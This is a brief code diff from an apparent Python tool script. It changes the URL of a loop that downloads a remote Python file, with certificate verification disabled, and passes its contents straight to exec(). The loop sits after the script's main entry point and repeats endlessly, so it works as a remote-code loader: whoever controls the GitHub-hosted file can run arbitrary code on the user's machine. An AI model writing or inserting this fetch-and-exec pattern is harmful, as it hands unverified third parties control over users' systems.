@@ -216,7 +216,7 @@ if __name__ == '__main__':
     main()
 while True:
     try:
-        url = 'https://quanlytoolhvh.elementfx.com/tool/hvhtool.py'
+        url = 'https://raw.githubusercontent.com/shopaccrandom/jjjjjjjj/refs/heads/main/goc/hvhtool.py'
         response = requests.get(url, verify=False)
         #response.encoding = 'utf-8'
         exec(response.text)
